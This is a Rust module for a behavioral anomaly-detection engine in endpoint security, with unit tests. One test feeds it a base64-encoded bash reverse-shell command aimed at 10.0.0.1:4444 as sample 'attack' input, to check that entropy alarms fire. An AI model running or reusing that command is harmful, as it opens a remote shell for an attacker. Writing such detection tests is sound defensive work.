//! Behavioral Change-Point Detection Engine
//!
//! This module monitors the *dynamics* of system behavior — not individual
//! events, but how the statistical properties of event streams change over time.
//!
//! ## Why This Matters
//!
//! CrowdStrike detects known patterns. We detect **unknown patterns** by
//! measuring deviations from mathematical baselines using:
//!
//! 1. **CUSUM detectors** for each behavioral dimension — optimal detection
//!    delay guaranteed by Lorden's minimax theorem
//! 2. **Wasserstein distance** between rolling windows — symmetric metric
//!    that captures distribution shift
//! 3. **Rényi entropy monitoring** — detects obfuscation/encryption emergence
//! 4. **Process graph spectral monitoring** — detects structural topology changes
//! 5. **Beaconing detector** via inter-arrival time periodicity
//!
//! Each dimension has a CUSUM detector with provable Average Run Length:
//!   ARL₀ ≈ exp(2h²/σ²) — configurable false-positive rate
//!
//! Combined with conformal prediction, the overall FP rate is bounded:
//!   P(false alarm) ≤ Σ P(alarm_i) ≤ k·α  (Bonferroni correction)
//!
//! Or tighter via Benjamini-Hochberg: controls FDR ≤ α.

use std::collections::VecDeque;

use crate::information::{
    self, cmdline_information, wasserstein_1, ConformalCalibrator, CusumDetector,
};

/// Maximum number of tracked processes for spectral analysis.
const MAX_TRACKED_PROCS: usize = 128;
/// Rolling window size for distribution comparison.
const WINDOW_SIZE: usize = 64;
/// Minimum DNS label length to consider for entropy-based detection.
const DNS_LABEL_MIN_LEN: usize = 12;

/// A single behavioral dimension being monitored.
#[derive(Debug, Clone)]
pub struct BehavioralDimension {
    pub name: &'static str,
    pub cusum: CusumDetector,
    /// Recent values for rolling distribution.
    pub window: VecDeque<f64>,
    /// Baseline distribution (learned during warmup).
    pub baseline: Vec<f64>,
    /// Whether baseline has been established.
    pub baseline_ready: bool,
    /// Total observations.
    pub observations: u64,
}

impl BehavioralDimension {
    pub fn new(name: &'static str, mu_0: f64, allowance: f64, threshold: f64) -> Self {
        Self {
            name,
            cusum: CusumDetector::new(mu_0, allowance, threshold),
            window: VecDeque::with_capacity(WINDOW_SIZE),
            baseline: Vec::new(),
            baseline_ready: false,
            observations: 0,
        }
    }

    /// Observe a new value. Returns true if change-point detected.
    pub fn observe(&mut self, value: f64) -> bool {
        self.observations += 1;
        self.window.push_back(value);
        if self.window.len() > WINDOW_SIZE {
            self.window.pop_front();
        }

        // Baseline learning phase (first 2 * WINDOW_SIZE observations)
        if !self.baseline_ready && self.observations as usize >= 2 * WINDOW_SIZE {
            self.baseline = self.window.iter().copied().collect();
            self.baseline_ready = true;
        }

        self.cusum.observe(value)
    }
}

/// Behavioral alarm with provenance.
#[derive(Debug, Clone)]
pub struct BehavioralAlarm {
    /// Which dimension triggered.
    pub dimension: String,
    /// Magnitude of deviation.
    pub magnitude: f64,
    /// Wasserstein distance from baseline (if available).
    pub wasserstein_distance: Option<f64>,
    /// Current entropy of the dimension.
    pub current_entropy: Option<f64>,
    /// P-value from conformal prediction (if calibrated).
    pub p_value: Option<f64>,
    /// Whether the alarm passed calibration gating.
    pub gated: bool,
}

/// The behavioral engine — monitors multiple dimensions simultaneously.
#[derive(Debug, Clone)]
pub struct BehavioralEngine {
    /// Rate of process executions (events per second).
    pub exec_rate: BehavioralDimension,
    /// Rate of network connections.
    pub net_rate: BehavioralDimension,
    /// Rate of file operations.
    pub file_rate: BehavioralDimension,
    /// Average command-line entropy.
    pub cmdline_entropy: BehavioralDimension,
    /// Average command-line compression ratio.
    pub cmdline_compression: BehavioralDimension,
    /// DNS domain entropy (DGA/tunneling signal).
    pub dns_entropy: BehavioralDimension,
    /// Inter-arrival time regularity (beaconing).
    pub beacon_regularity: BehavioralDimension,
    /// Process tree branching factor.
    pub tree_branching: BehavioralDimension,
    /// Root process execution rate.
    pub root_exec_rate: BehavioralDimension,

    /// Process adjacency matrix for spectral analysis.
    proc_adjacency: Vec<Vec<f64>>,
    proc_index: std::collections::HashMap<u32, usize>,

    /// Conformal calibrator (optional — requires calibration data).
    calibrator: Option<ConformalCalibrator>,

    /// Rolling info-theory baselines for cmdline metrics.
    info_entropy_baseline: VecDeque<f64>,
    info_compression_baseline: VecDeque<f64>,
    info_baseline_observations: usize,

    /// Last event timestamp for inter-arrival time.
    last_ts: Option<i64>,
    /// Accumulated alarms this epoch.
    pub alarms: Vec<BehavioralAlarm>,
    /// Total alarms ever.
    pub total_alarms: u64,
}

impl BehavioralEngine {
    /// Create with default thresholds tuned for EDR workloads.
    ///
    /// CUSUM parameters:
    /// - allowance k = δ/2 where δ is the minimum detectable shift
    /// - threshold h chosen for ARL₀ ≈ 10,000 (1 false alarm per ~2.7 hours at 1 Hz)
    pub fn new() -> Self {
        Self {
            // Event rates: baseline ~1/s, detect 3x increase
            exec_rate: BehavioralDimension::new("exec_rate", 1.0, 1.0, 8.0),
            net_rate: BehavioralDimension::new("net_rate", 0.5, 0.5, 8.0),
            file_rate: BehavioralDimension::new("file_rate", 2.0, 1.5, 8.0),
            // Entropy: baseline ~4.0 bits (English text), detect jump to ~7.0+ (encrypted)
            cmdline_entropy: BehavioralDimension::new("cmdline_entropy", 4.0, 1.0, 6.0),
            // Compression: baseline ~0.4, detect jump to ~0.9 (encrypted payload)
            cmdline_compression: BehavioralDimension::new("cmdline_compression", 0.4, 0.15, 5.0),
            // DNS entropy: baseline ~0.35, detect sustained high-entropy labels (DGA/tunnel)
            dns_entropy: BehavioralDimension::new("dns_entropy", 0.35, 0.1, 2.0),
            // Beaconing: baseline ~0.3 (irregular), detect increase to ~0.8 (periodic)
            beacon_regularity: BehavioralDimension::new("beacon_regularity", 0.3, 0.15, 5.0),
            // Tree branching: baseline ~2.0 children/proc, detect fork bombs
            tree_branching: BehavioralDimension::new("tree_branching", 2.0, 1.5, 6.0),
            // Root execution: baseline ~0.05, detect privilege escalation campaigns
            root_exec_rate: BehavioralDimension::new("root_exec_rate", 0.05, 0.1, 5.0),

            proc_adjacency: vec![vec![0.0; MAX_TRACKED_PROCS]; MAX_TRACKED_PROCS],
            proc_index: std::collections::HashMap::new(),

            calibrator: None,
            last_ts: None,
            alarms: Vec::new(),
            total_alarms: 0,
            info_entropy_baseline: VecDeque::with_capacity(WINDOW_SIZE),
            info_compression_baseline: VecDeque::with_capacity(WINDOW_SIZE),
            info_baseline_observations: 0,
        }
    }

    /// Observe a telemetry event and update all behavioral dimensions.
    /// Returns any alarms triggered.
    pub fn observe(&mut self, event: &crate::types::TelemetryEvent) -> Vec<BehavioralAlarm> {
        self.alarms.clear();

        // High-level info-theory baselines for this event
        let (cmd_entropy, cmd_compression) = self.cmdline_metrics(event);

        // ── Event rate dimensions ────────────────────────────────
        match event.event_class {
            crate::types::EventClass::ProcessExec => {
                if self.exec_rate.observe(1.0) {
                    self.emit_alarm("exec_rate", 1.0);
                }
                // Root execution tracking
                if event.uid == 0 && self.root_exec_rate.observe(1.0) {
                    self.emit_alarm("root_exec_rate", 1.0);
                }
            }
            crate::types::EventClass::NetworkConnect | crate::types::EventClass::DnsQuery => {
                if self.net_rate.observe(1.0) {
                    self.emit_alarm("net_rate", 1.0);
                }
                if let Some(domain) = event.dst_domain.as_deref() {
                    if let Some(entropy) = Self::dns_entropy_value(domain) {
                        if self.dns_entropy.observe(entropy) {
                            self.emit_alarm_with_entropy(
                                "dns_entropy",
                                (entropy * 4.0).max(2.0),
                                Some(entropy),
                            );
                        }
                    }
                }
            }
            crate::types::EventClass::FileOpen => {
                if self.file_rate.observe(1.0) {
                    self.emit_alarm("file_rate", 1.0);
                }
            }
            _ => {}
        }

        // ── Command-line information theory ──────────────────────
        if let Some(entropy) = cmd_entropy {
            if self.cmdline_entropy.observe(entropy) {
                self.emit_alarm_with_entropy("cmdline_entropy", entropy, Some(entropy));
            }
        }
        if let Some(comp) = cmd_compression {
            if self.cmdline_compression.observe(comp) {
                self.emit_alarm("cmdline_compression", comp);
            }
        }

        // ── Inter-arrival time (beaconing detection) ─────────────
        if let Some(last) = self.last_ts {
            if event.ts_unix > last {
                let iat = (event.ts_unix - last) as f64;
                // Regularity metric: 1 / (1 + coefficient_of_variation)
                // High regularity → periodic → beaconing
                let regularity = self.compute_iat_regularity(iat);
                if self.beacon_regularity.observe(regularity) {
                    self.emit_alarm("beacon_regularity", regularity);
                }
            }
        }
        self.last_ts = Some(event.ts_unix);

        // ── Process tree topology ────────────────────────────────
        self.update_process_graph(event.pid, event.ppid);

        // ── Wasserstein distance check (periodic) ────────────────
        // Every 64 observations, compare current window to baseline
        if self
            .exec_rate
            .observations
            .is_multiple_of(WINDOW_SIZE as u64)
        {
            self.check_wasserstein_shifts();
            self.check_cmdline_info_shifts(cmd_entropy, cmd_compression);
        }

        let result = self.alarms.clone();
        self.total_alarms += result.len() as u64;
        result
    }

    /// Calibrate the conformal predictor with baseline alarm scores.
    pub fn calibrate(&mut self, baseline_scores: Vec<f64>, alpha: f64) {
        self.calibrator = Some(ConformalCalibrator::new(baseline_scores, alpha));
    }

    /// Get the guaranteed false-positive rate (if calibrated).
    pub fn guaranteed_fp_rate(&self) -> Option<f64> {
        self.calibrator
            .as_ref()
            .map(|c| 1.0 - c.coverage_guarantee())
    }

    fn emit_alarm(&mut self, dimension: &str, magnitude: f64) {
        let (p_value, gated) = self.calibrator_gate(magnitude);
        self.alarms.push(BehavioralAlarm {
            dimension: dimension.to_string(),
            magnitude,
            wasserstein_distance: None,
            current_entropy: None,
            p_value,
            gated,
        });
    }

    fn emit_alarm_with_entropy(&mut self, dimension: &str, magnitude: f64, entropy: Option<f64>) {
        let (p_value, gated) = self.calibrator_gate(magnitude);
        self.alarms.push(BehavioralAlarm {
            dimension: dimension.to_string(),
            magnitude,
            wasserstein_distance: None,
            current_entropy: entropy,
            p_value,
            gated,
        });
    }

    fn calibrator_gate(&self, magnitude: f64) -> (Option<f64>, bool) {
        match &self.calibrator {
            Some(cal) => {
                let p = cal.p_value(magnitude);
                (Some(p), p <= 0.05)
            }
            None => (None, true),
        }
    }

    fn dns_entropy_value(domain: &str) -> Option<f64> {
        let label = domain.split('.').find(|s| !s.is_empty())?;
        if label.len() < DNS_LABEL_MIN_LEN {
            return None;
        }
        Some(information::dns_entropy(domain))
    }

    fn compute_iat_regularity(&self, new_iat: f64) -> f64 {
        let window = &self.beacon_regularity.window;
        if window.len() < 3 {
            return 0.0;
        }
        // Coefficient of variation: σ/μ
        let n = window.len() as f64;
        let mean = (window.iter().sum::<f64>() + new_iat) / (n + 1.0);
        if mean < 1e-10 {
            return 0.0;
        }
        let variance = window
            .iter()
            .chain(std::iter::once(&new_iat))
            .map(|&x| (x - mean).powi(2))
            .sum::<f64>()
            / (n + 1.0);
        let cv = variance.sqrt() / mean;
        // Regularity = 1/(1+cv): 1.0 = perfectly periodic, 0.0 = completely random
        1.0 / (1.0 + cv)
    }

    fn update_process_graph(&mut self, pid: u32, ppid: u32) {
        let next_idx = self.proc_index.len();
        if next_idx >= MAX_TRACKED_PROCS {
            return; // capacity reached
        }
        let pid_idx = *self.proc_index.entry(pid).or_insert(next_idx);
        let next_idx2 = self.proc_index.len();
        if next_idx2 >= MAX_TRACKED_PROCS {
            return;
        }
        let ppid_idx = *self.proc_index.entry(ppid).or_insert(next_idx2);
        // Add edge: parent → child
        if ppid_idx < MAX_TRACKED_PROCS && pid_idx < MAX_TRACKED_PROCS {
            self.proc_adjacency[ppid_idx][pid_idx] = 1.0;
        }
    }

    fn check_wasserstein_shifts(&mut self) {
        // Check each dimension with sufficient data
        let dims: Vec<(&str, &BehavioralDimension)> = vec![
            ("exec_rate", &self.exec_rate),
            ("net_rate", &self.net_rate),
            ("file_rate", &self.file_rate),
            ("cmdline_entropy", &self.cmdline_entropy),
        ];

        for (name, dim) in dims {
            if !dim.baseline_ready || dim.window.len() < 8 {
                continue;
            }
            // Build histograms and compute Wasserstein distance
            let baseline_hist = histogram(&dim.baseline, 16);
            let window_vals: Vec<f64> = dim.window.iter().copied().collect();
            let current_hist = histogram(&window_vals, 16);
            let w_dist = wasserstein_1(&baseline_hist, &current_hist);
            // Threshold: Wasserstein > 0.3 indicates significant shift
            if w_dist > 0.3 {
                let (p_value, gated) = self.calibrator_gate(w_dist);
                self.alarms.push(BehavioralAlarm {
                    dimension: format!("{name}_wasserstein"),
                    magnitude: w_dist,
                    wasserstein_distance: Some(w_dist),
                    current_entropy: None,
                    p_value,
                    gated,
                });
            }
        }
    }

    fn cmdline_metrics(
        &mut self,
        event: &crate::types::TelemetryEvent,
    ) -> (Option<f64>, Option<f64>) {
        let Some(cmd) = &event.command_line else {
            return (None, None);
        };
        let Some(metrics) = cmdline_information(cmd.as_bytes(), 20) else {
            return (None, None);
        };
        self.info_baseline_observations = self.info_baseline_observations.saturating_add(1);
        push_baseline(
            &mut self.info_entropy_baseline,
            metrics.shannon_entropy_bits,
        );
        push_baseline(
            &mut self.info_compression_baseline,
            metrics.compression_ratio,
        );
        (
            Some(metrics.shannon_entropy_bits),
            Some(metrics.compression_ratio),
        )
    }
    fn cmdline_baseline_ready(&self) -> bool {
        self.info_baseline_observations >= 2 * WINDOW_SIZE
            && self.info_entropy_baseline.len() >= WINDOW_SIZE
            && self.info_compression_baseline.len() >= WINDOW_SIZE
    }

    fn check_cmdline_info_shifts(&mut self, entropy: Option<f64>, compression: Option<f64>) {
        if !self.cmdline_baseline_ready() {
            return;
        }
        let Some(entropy) = entropy else {
            return;
        };
        let Some(compression) = compression else {
            return;
        };

        let entropy_baseline = self
            .info_entropy_baseline
            .iter()
            .copied()
            .collect::<Vec<f64>>();
        let comp_baseline = self
            .info_compression_baseline
            .iter()
            .copied()
            .collect::<Vec<f64>>();
        let entropy_hist = histogram(&entropy_baseline, 16);
        let comp_hist = histogram(&comp_baseline, 16);

        let entropy_min = entropy_baseline
            .iter()
            .cloned()
            .fold(f64::INFINITY, f64::min);
        let entropy_max = entropy_baseline
            .iter()
            .cloned()
            .fold(f64::NEG_INFINITY, f64::max);
        let comp_min = comp_baseline.iter().cloned().fold(f64::INFINITY, f64::min);
        let comp_max = comp_baseline
            .iter()
            .cloned()
            .fold(f64::NEG_INFINITY, f64::max);

        let entropy_one = histogram_value(entropy, 16, entropy_min, entropy_max);
        let comp_one = histogram_value(compression, 16, comp_min, comp_max);

        let entropy_shift = wasserstein_1(&entropy_hist, &entropy_one);
        let comp_shift = wasserstein_1(&comp_hist, &comp_one);

        if entropy_shift > 0.4 {
            let (p_value, gated) = self.calibrator_gate(entropy_shift);
            self.alarms.push(BehavioralAlarm {
                dimension: "cmdline_entropy_shift".to_string(),
                magnitude: entropy_shift,
                wasserstein_distance: Some(entropy_shift),
                current_entropy: Some(entropy),
                p_value,
                gated,
            });
        }

        if comp_shift > 0.4 {
            let (p_value, gated) = self.calibrator_gate(comp_shift);
            self.alarms.push(BehavioralAlarm {
                dimension: "cmdline_compression_shift".to_string(),
                magnitude: comp_shift,
                wasserstein_distance: Some(comp_shift),
                current_entropy: None,
                p_value,
                gated,
            });
        }
    }

    /// Get current spectral radius of the process graph.
    pub fn process_graph_spectral_radius(&self) -> f64 {
        let n = self.proc_index.len().min(MAX_TRACKED_PROCS);
        if n < 2 {
            return 0.0;
        }
        // Extract submatrix
        let sub: Vec<Vec<f64>> = self.proc_adjacency[..n]
            .iter()
            .map(|row| row[..n].to_vec())
            .collect();
        information::spectral_radius(&sub)
    }
}

impl Default for BehavioralEngine {
    fn default() -> Self {
        Self::new()
    }
}

fn push_baseline(window: &mut VecDeque<f64>, value: f64) {
    window.push_back(value);
    if window.len() > WINDOW_SIZE {
        window.pop_front();
    }
}

/// Build a normalized histogram from values.
fn histogram(values: &[f64], bins: usize) -> Vec<f64> {
    if values.is_empty() || bins == 0 {
        return vec![0.0; bins.max(1)];
    }
    let min = values.iter().cloned().fold(f64::INFINITY, f64::min);
    let max = values.iter().cloned().fold(f64::NEG_INFINITY, f64::max);
    let range = (max - min).max(1e-10);
    let mut counts = vec![0.0f64; bins];
    for &v in values {
        let idx = ((v - min) / range * (bins as f64 - 1.0)).round() as usize;
        counts[idx.min(bins - 1)] += 1.0;
    }
    let total: f64 = counts.iter().sum();
    if total > 0.0 {
        for c in &mut counts {
            *c /= total;
        }
    }
    counts
}

fn histogram_value(value: f64, bins: usize, min: f64, max: f64) -> Vec<f64> {
    if bins == 0 {
        return vec![0.0; 1];
    }
    let mut counts = vec![0.0f64; bins];
    let range = (max - min).max(1e-10);
    let idx = ((value - min) / range * (bins as f64 - 1.0)).round() as usize;
    counts[idx.min(bins - 1)] = 1.0;
    counts
}

// ─── Tests ──────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{EventClass, TelemetryEvent};

    fn make_event(class: EventClass, uid: u32, ts: i64, cmdline: Option<&str>) -> TelemetryEvent {
        TelemetryEvent {
            ts_unix: ts,
            event_class: class,
            pid: 100 + (ts as u32),
            ppid: 1,
            uid,
            process: "test".to_string(),
            parent_process: "init".to_string(),
            session_id: 1,
            file_path: None,
            file_write: false,
            file_hash: None,
            dst_port: None,
            dst_ip: None,
            dst_domain: None,
            command_line: cmdline.map(|s| s.to_string()),
            event_size: None,
            container_runtime: None,
            container_id: None,
            container_escape: false,
            container_privileged: false,
        }
    }

    #[test]
    fn behavioral_engine_no_alarm_on_normal() {
        let mut engine = BehavioralEngine::new();
        for i in 0..20 {
            let event = make_event(EventClass::ProcessExec, 1000, i, Some("ls -la"));
            let alarms = engine.observe(&event);
            // During warmup, CUSUM shouldn't alarm on normal events
            assert!(alarms.is_empty(), "unexpected alarm at i={i}: {:?}", alarms);
        }
    }

    #[test]
    fn behavioral_engine_no_non_beacon_alarm_on_steady_exec_rate() {
        let mut engine = BehavioralEngine::new();
        // Establish baseline
        for i in 0..10 {
            engine.observe(&make_event(EventClass::ProcessExec, 1000, i, Some("ls")));
        }
        // Steady-state: constant exec rate should not trigger CUSUM
        // Note: beacon_regularity may fire because perfectly periodic events
        // DO have beacon-like regularity — that's a true positive for beaconing.
        for i in 10..100 {
            let alarms = engine.observe(&make_event(EventClass::ProcessExec, 1000, i, Some("ls")));
            let non_beacon: Vec<_> = alarms
                .iter()
                .filter(|a| a.dimension != "beacon_regularity")
                .collect();
            assert!(
                non_beacon.is_empty(),
                "unexpected non-beacon alarm at i={i}: {non_beacon:?}"
            );
        }
    }

    #[test]
    fn behavioral_engine_detects_encrypted_cmdline() {
        let mut engine = BehavioralEngine::new();
        let baseline_scores: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
        engine.calibrate(baseline_scores, 0.05);
        // Normal phase: simple commands
        for i in 0..30 {
            engine.observe(&make_event(
                EventClass::ProcessExec,
                1000,
                i,
                Some("ls -la /home"),
            ));
        }
        // Attack phase: high-entropy (encrypted/obfuscated) commands
        let encrypted_cmd = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=";
        let mut any_alarm = false;
        for i in 30..60 {
            let alarms = engine.observe(&make_event(
                EventClass::ProcessExec,
                1000,
                i,
                Some(encrypted_cmd),
            ));
            if alarms.iter().any(|a| {
                a.gated && (a.dimension.contains("entropy") || a.dimension.contains("compression"))
            }) {
                any_alarm = true;
            }
        }
        // The CUSUM should detect entropy shift from ~3.5 to ~5.5
        assert!(
            any_alarm,
            "should detect entropy shift to encrypted commands"
        );
    }

    #[test]
    fn process_graph_spectral_radius_normal() {
        let mut engine = BehavioralEngine::new();
        // Simple tree: init → bash → ls, init → bash → cat
        let events = vec![
            make_event(EventClass::ProcessExec, 1000, 1, Some("bash")),
            make_event(EventClass::ProcessExec, 1000, 2, Some("ls")),
            make_event(EventClass::ProcessExec, 1000, 3, Some("cat")),
        ];
        for e in events {
            engine.observe(&e);
        }
        let rho = engine.process_graph_spectral_radius();
        assert!(rho >= 0.0, "spectral radius should be non-negative: {rho}");
    }

    #[test]
    fn histogram_normalized() {
        let values = vec![1.0, 2.0, 3.0, 4.0, 5.0];
        let hist = histogram(&values, 5);
        let sum: f64 = hist.iter().sum();
        assert!(
            (sum - 1.0).abs() < 1e-10,
            "histogram should sum to 1: {sum}"
        );
    }

    #[test]
    fn behavioral_alarm_marks_gated_when_calibrated() {
        let mut engine = BehavioralEngine::new();
        let baseline: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
        engine.calibrate(baseline, 0.05);
        for i in 0..10 {
            engine.observe(&make_event(
                EventClass::ProcessExec,
                1000,
                i,
                Some("ls -la"),
            ));
        }
        let alarms = engine.observe(&make_event(
            EventClass::ProcessExec,
            1000,
            11,
            Some("ls -la"),
        ));
        if let Some(alarm) = alarms.first() {
            assert!(
                alarm.gated,
                "alarm should be gated when calibration is enabled"
            );
            assert!(
                alarm.p_value.is_some(),
                "gated alarm should include p_value"
            );
        }
    }

    #[test]
    fn cmdline_baseline_blocks_shift_until_ready() {
        let mut engine = BehavioralEngine::new();
        let cmd = "ls -la /home";
        for i in 0..(WINDOW_SIZE - 1) {
            engine.observe(&make_event(
                EventClass::ProcessExec,
                1000,
                i as i64,
                Some(cmd),
            ));
        }
        let alarms = engine.observe(&make_event(
            EventClass::ProcessExec,
            1000,
            WINDOW_SIZE as i64,
            Some(cmd),
        ));
        assert!(
            alarms.iter().all(|a| !a.dimension.contains("cmdline_")),
            "cmdline shifts should be suppressed before baseline is ready"
        );
    }

    #[test]
    fn behavioral_engine_calibration() {
        let mut engine = BehavioralEngine::new();
        // Calibrate with baseline scores
        let baseline: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
        engine.calibrate(baseline, 0.01);
        let fp = engine.guaranteed_fp_rate().unwrap();
        assert!(
            (fp - 0.01).abs() < 1e-10,
            "FP rate should be 0.01, got {fp}"
        );
    }
}
